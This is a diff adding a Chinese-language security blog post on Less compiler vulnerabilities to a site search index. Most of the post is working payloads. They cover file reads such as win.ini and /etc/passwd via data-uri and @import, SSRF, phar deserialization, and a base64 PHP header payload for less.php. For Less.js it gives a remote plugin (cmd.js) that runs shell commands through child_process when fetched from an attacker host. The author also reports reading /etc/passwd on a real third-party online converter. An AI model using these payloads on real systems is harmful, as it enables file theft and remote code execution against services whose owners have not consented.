@@ -1411,4 +1411,108 @@ ThinkPHP &gt;= 5.1.42</p>
         <tag>工具使用</tag>
       </tags>
   </entry>
+  <entry>
+    <title>Less编译器漏洞汇总</title>
+    <url>/2024/04/14/Less%E7%BC%96%E8%AF%91%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%B1%87%E6%80%BB/</url>
+    <content><![CDATA[<h2 id="简介">简介</h2>
+<p><a href="https://lesscss.org/">Less</a>是一个完全兼容CSS的语言</p>
+<p>并在CSS的基础上提供了很多高级语法与功能，比如CSS中不支持的条件判断与循环，相当于是CSS语言的超集。</p>
+<p>前端开发者使用Less编写的程序，可以通过<mark>编译器</mark>转换成合法的CSS语法，提供给浏览器进行渲染。</p>
+<p>常见的编译器有nodejs的Less.js、php的less.php</p>
+<h2 id="Less-php漏洞">Less.php漏洞</h2>
+<h4 id="环境安装">环境安装:</h4>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用composer安装</span><br><span class="line">composer require oyejorge/less.php</span><br><span class="line"></span><br><span class="line">#使用时只需包含php文件</span><br><span class="line">require &#x27;vendor/autoload.php&#x27;;</span><br></pre></td></tr></table></figure>
+<h4 id="任意文件读取">任意文件读取</h4>
+<h5 id="data-uri">data-uri</h5>
+<p>在less官网可以看到一个函数<a href="https://lesscss.org/functions/#misc-functions-data-uri">data-uri</a>，该函数用于读取文件并转换成data协议输出在css中</p>
+<p>我们再看到分析<code>less.php</code>是如何处理该函数的，在Functions.php的第851行我们可以看到如下处理代码</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function datauri( $mimetypeNode, $filePathNode = null ) &#123;</span><br><span class="line">    $filePath = ( $filePathNode ? $filePathNode-&gt;value : null );</span><br><span class="line">    // ...</span><br><span class="line"></span><br><span class="line">    if ( file_exists( $filePath ) ) &#123;</span><br><span class="line">        $buf = @file_get_contents( $filePath );</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $buf = false;</span><br><span class="line">    &#125;</span><br><span class="line">    // ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>这是一个可以控制完整路径的文件读取漏洞</p>
+<p>所以我们只需构造如下<mark>less</mark>代码交给Less.php解析即可读取任意文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;less/vendor/autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">$data=&lt;&lt;&lt;&#x27;CSS&#x27;</span><br><span class="line">.test &#123;</span><br><span class="line">  content: data-uri(&#x27;C:\Windows\win.ini&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">CSS;</span><br><span class="line">$parser = new Less_Parser();</span><br><span class="line">$parser-&gt;parse($data);</span><br><span class="line">$css= $parser-&gt;getCss();</span><br><span class="line">echo $css;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014027.png" alt="image-20240414150310573"></p>
+<h5 id="import">@import</h5>
+<p>在CSS或Less中，<a href="https://lesscss.org/features/#import-atrules-feature"><code>@import</code></a>用于导入外部CSS，类似于PHP中的include。当在服务器端处理Less代码时，这可用于SSRF和本地文件泄露。</p>
+<p>分析源码在Import.php的第171行我们可以发现如下语句</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if( $this-&gt;options[&#x27;inline&#x27;] )&#123;</span><br><span class="line">			Less_Parser::AddParsedFile($full_path);</span><br><span class="line">			$contents = new Less_Tree_Anonymous( file_get_contents($full_path), 0, array(), true );</span><br><span class="line">			....</span><br><span class="line">			....</span><br></pre></td></tr></table></figure>
+<p>只要选项是<code>$this-&gt;options['inline']</code>为<code>True</code>即可没有限制的<code>file_get_contents($full_path)</code>，而在<code>@import</code>语句后面指定<code>inline</code>选项即可使得条件成立。</p>
+<p>所以我们也可以通过@import读取到文件内容</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">&quot;less/vendor/autoload.php&quot;</span>;</span><br><span class="line"><span class="variable">$data</span>=<span class="string">&lt;&lt;&lt;&#x27;CSS&#x27;</span></span><br><span class="line"><span class="string">@import (inline) &quot;C:\Windows\win.ini&quot;;</span></span><br><span class="line"><span class="string">CSS</span>;</span><br><span class="line"><span class="variable">$parser</span> = <span class="keyword">new</span> <span class="title class_">Less_Parser</span>();</span><br><span class="line"><span class="variable">$parser</span>-&gt;<span class="title function_ invoke__">parse</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="variable">$css</span>= <span class="variable">$parser</span>-&gt;<span class="title function_ invoke__">getCss</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$css</span>;</span><br></pre></td></tr></table></figure>
+<h4 id="SSRF">SSRF</h4>
+<h5 id="import-2">@import</h5>
+<p>在<code>@import</code>中无限制的<code>file_get_contents</code>可以用来访问url，从而造成SSRF漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;less/vendor/autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">$data=&lt;&lt;&lt;&#x27;CSS&#x27;</span><br><span class="line">@import (inline) &quot;http://localhost/test.html&quot;;</span><br><span class="line">CSS;</span><br><span class="line">$parser = new Less_Parser();</span><br><span class="line">$parser-&gt;parse($data);</span><br><span class="line">$css= $parser-&gt;getCss();</span><br><span class="line">echo $css;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014028.png" alt="image-20240414152206716"></p>
+<h4 id="phar反序列化">phar反序列化</h4>
+<h5 id="data-uri-2">data-uri</h5>
+<p>在上面的源码中我们可以看到<code>data-uri</code>处理时先会<code>file_exists( $filePath )</code>进行判断，而<code>file_exists</code>是可以解析phar的</p>
+<p>所以我们就可以利用这一点进行<code>phar反序列化</code>的利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;less/vendor/autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">$data=&lt;&lt;&lt;&#x27;CSS&#x27;</span><br><span class="line">.test &#123;</span><br><span class="line">  content: data-uri(&#x27;phar:/./test.php&#x27;);</span><br><span class="line">&#125;</span><br><span class="line">CSS;</span><br><span class="line">$parser = new Less_Parser();</span><br><span class="line">$parser-&gt;parse($data);</span><br><span class="line">$css= $parser-&gt;getCss();</span><br><span class="line">echo $css;</span><br></pre></td></tr></table></figure>
+<h4 id="文件头部写入">文件头部写入</h4>
+<h5 id="import-3">@import</h5>
+<p>在Less.php底层，<code>@import</code>时有如下判断逻辑：</p>
+<ul class="lvl-0">
+<li class="lvl-2">
+<p>如果发现包含的文件是less，则对其进行编译解析，并将结果输出在当前文件中</p>
+</li>
+<li class="lvl-2">
+<p>如果发现包含的文件是css，则不对其进行处理，直接将<code>@import</code>这个语句输出在页面最前面</p>
+</li>
+</ul>
+<p>第二种情况可以“控制”文件头，虽然可控的内容只是一个<code>@import</code>语句。但我们<code>data:</code>协议来控制其写入任意的文件头部内容</p>
+<p>该方法只能控制css文件的头部,一般结合文件包含或者phar反序列化来使用。</p>
+<p>比如</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;less/vendor/autoload.php&quot;;</span><br><span class="line"></span><br><span class="line">$data=&lt;&lt;&lt;&#x27;CSS&#x27;</span><br><span class="line">.test &#123;</span><br><span class="line">  width: 1337px;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@import (inline) &#x27;data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+&#x27;;</span><br><span class="line">CSS;</span><br><span class="line">$parser = new Less_Parser();</span><br><span class="line">$parser-&gt;parse($data);</span><br><span class="line">$css= $parser-&gt;getCss();</span><br><span class="line">echo $css;</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014029.png" alt="image-20240414161247820"></p>
+<h4 id="其他">其他</h4>
+<p>在寻找less.php的过程中,发现如下源码库<a href="https://github.com/leafo/lessphp">https://github.com/leafo/lessphp</a></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014030.png" alt="image-20240414162756486"></p>
+<p>发现star数很多,但版本较老，根据安装提示下载了<a href="https://github.com/leafo/lessphp/blob/master/lessc.inc.php">lessc.inc.php</a>并使用如下语句进行任意文件读取等漏洞测试</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">require &quot;lessc.inc.php&quot;;</span><br><span class="line"></span><br><span class="line">$less = new lessc;</span><br><span class="line">echo $less-&gt;compile(&quot;.test &#123;content: data-uri(&#x27;C:/Windows/win.ini&#x27;);&#125;&quot;);</span><br></pre></td></tr></table></figure>
+<p>发现无法读取文件</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014032.png" alt="image-20240414163606332"></p>
+<p>跟进查看发现其对data-uri的实现是这样的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protected function lib_data_uri($value) &#123;</span><br><span class="line">    $mime = ($value[0] === &#x27;list&#x27;) ? $value[2][0][2] : null;</span><br><span class="line">    $url = ($value[0] === &#x27;list&#x27;) ? $value[2][1][2][0] : $value[2][0];</span><br><span class="line">    $fullpath = $this-&gt;findImport($url);</span><br><span class="line">    if ($fullpath &amp;&amp; ($fsize = filesize($fullpath)) !== false) &#123;</span><br><span class="line">    		.....</span><br><span class="line">    		.....</span><br><span class="line">            if (!is_null($mime)) // fallback if the mime type is still unknown</span><br><span class="line">                $url = sprintf(&#x27;data:%s;base64,%s&#x27;, $mime, base64_encode(file_get_contents($fullpath)));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>其中<code>findImport</code>会判断传入的url如果url末尾不存在<code>\</code>就在url的开头加上<code>\</code>，然后再判断路径是否存在，存在则返回路径，也就是说我们的url被解析为了<code>/C:/Windows/win.ini</code>，而这个文件是不存在的。所以<code>$fullpath </code>为空自然无法读取到文件。</p>
+<p>在linux下因为根目录为<code>/</code>所以这个问题不显著,且也可以解析<code>//etc/passwd</code></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014033.png" alt="image-20240414163953073"></p>
+<p>而在windows下<code>/</code>可以表示当前盘符,所以我们可以在路径前去掉盘符来读取任意文件,但这也只能读取当前盘符的文件了</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014034.png" alt="image-20240414164123730"></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014035.png" alt="image-20240414164327686"></p>
+<p>原因嘛…我猜测是less.php版本太低还没优化好</p>
+<h3 id="Less-js漏洞">Less.js漏洞</h3>
+<h4 id="环境安装-2">环境安装</h4>
+<p>官网:<a href="https://lesscss.org/#">https://lesscss.org/#</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#使用官方文档的安装方法</span><br><span class="line">npm install -g less</span><br></pre></td></tr></table></figure>
+<h4 id="远程RCE">远程RCE</h4>
+<p>Less.js库支持插件，这些插件可以使用@plugin语法直接包含在远程的Less代码中。插件使用JavaScript编写，当Less代码被解释时，任何包含的插件都会执行。这可能会导致两种结果，具体取决于Less处理器的上下文。如果在客户端处理Less代码，则会导致跨站脚本攻击。如果在服务器端处理Less代码，则会导致远程代码执行。所有支持 @plugin语法的Less版本都容易受到攻击。</p>
+<p>原理是利用<code>@plugin</code>加载远程js代码(有格式要求)的功能配合nodejs的代码执行函数实现RCE</p>
+<p>新建一个<code>cmd.js</code>内容如下,将其上传到远程服务器并能被远程访问到</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">registerPlugin(&#123;    </span><br><span class="line">     install: function(less, pluginManager, functions) &#123;        </span><br><span class="line">             functions.add(&#x27;cmd&#x27;, function(val) &#123;            </span><br><span class="line">                   return global.process.mainModule.require(&#x27;child_process&#x27;).execSync(val.value).toString();        </span><br><span class="line">              &#125;);    </span><br><span class="line">        &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014036.png" alt="image-20240414161831555"></p>
+<p>构造<code>cmd.less</code>文件,内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">@plugin &quot;http://your-ip:8888/cmd.js&quot;;</span><br><span class="line"></span><br><span class="line">body &#123;</span><br><span class="line">color: cmd(&#x27;whoami&#x27;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>在命令行中执行以下指令,将less文件转换为css文件并执行恶意指令</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lessc cmd.less result.css</span><br></pre></td></tr></table></figure>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014037.png" alt="image-20240414162105651"></p>
+<p>可以看到远程主机上的<code>cmd.js</code>被访问</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014038.png" alt="image-20240414162152774"></p>
+<h4 id="任意文件读取-2">任意文件读取</h4>
+<p>和less.php的两种读取方法构造的less文件相同</p>
+<h4 id="SSRF-2">SSRF</h4>
+<p>和less.php的ssrf构造的less文件相同</p>
+<h3 id="真实示例">真实示例</h3>
+<p>找到一个国外less-to-css的在线网站，测试使用data-uri读取任意文件</p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014039.png" alt="image-20240414162522071"></p>
+<p><img src="https://ltmthink-blogimages.oss-cn-hangzhou.aliyuncs.com/imgs/202404150014040.png" alt="image-20240414162607853"></p>
+<p>成功读取到<code>/etc/passwd</code></p>
+]]></content>
+      <categories>
+        <category>less漏洞</category>
+        <category>代码审计</category>
+      </categories>
+      <tags>
+        <tag>less漏洞</tag>
+      </tags>
+  </entry>
 </search>
